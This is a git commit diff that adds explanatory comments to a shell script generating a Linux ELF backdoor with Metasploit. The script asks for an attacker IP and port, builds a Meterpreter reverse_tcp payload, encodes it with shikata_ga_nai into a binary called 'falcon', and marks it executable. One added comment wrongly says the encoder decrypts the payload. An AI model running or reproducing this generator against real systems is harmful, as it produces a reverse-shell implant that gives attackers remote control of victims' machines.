9af55fa82959f2cb5ee3608d81de996c1fac6c73
falconflame <flame.axoneme@gmail.com>
2015-03-01 22:05:53 +0800

    adding comment explanation
    Explaining the commands in the script

--- msfpayloadlinux.sh
+++ msfpayloadlinux.sh
@@ -3,6 +3,7 @@
 #This is just script from http://astrobaby.wordpress.com
 #Modified & Tested by falconflame a.k.a dr. F
 
+#Enter the value of localhost and localport using read var method
 clear
 echo "*********************************************"
 echo "  LINUX ELF BINARY GENERATOR FOR METASPLOIT  "
@@ -12,8 +13,11 @@ read IP
 echo -e "What port number are we gonna listen to?: \c"
 read port
 
+#Below we choose a payload then import the localhost and localport from the value entered in the variable above
+#Make it raw data, then by using pipeline we decrypt the payload using encoder
 msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R | msfencode -t elf -e x86/shikata_ga_nai >> falcon
 
+#After the payload has been made, make it executable, then list it...
 echo "falcon binary generated..."
 chmod ug=rwx falcon
 ls -la falcon
